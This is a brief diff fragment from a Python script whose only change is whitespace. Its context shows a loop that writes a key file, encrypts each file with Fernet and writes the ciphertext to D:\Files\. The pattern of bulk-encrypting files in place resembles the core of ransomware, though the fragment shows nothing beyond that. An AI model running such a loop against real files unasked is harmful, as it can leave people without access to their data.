@@ -23,7 +23,7 @@ for x in vec:
         filekey.write(key)
 
     encrypted = fernet.encrypt(original)
-
+ 
     with open('D:\Files\{}'.format(x), 'wb') as encrypted_file:
         encrypted_file.write(encrypted)
      
